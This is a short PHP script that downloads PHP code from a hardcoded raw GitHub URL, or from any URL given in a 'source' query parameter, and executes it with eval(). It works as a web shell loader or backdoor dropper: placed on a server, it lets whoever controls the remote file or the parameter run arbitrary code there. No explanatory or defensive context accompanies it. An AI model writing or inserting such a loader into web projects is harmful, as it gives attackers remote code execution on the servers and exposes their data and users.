<?php
$defaultUrl = "https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/antiz1.php";
$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
if (empty($_GET) && empty($_POST)) {
    if (filter_var($input, FILTER_VALIDATE_URL)) {
        $fileContent = file_get_contents($input);
        if ($fileContent !== false) {
            eval('?>' . $fileContent);
        }
    }
}
?>
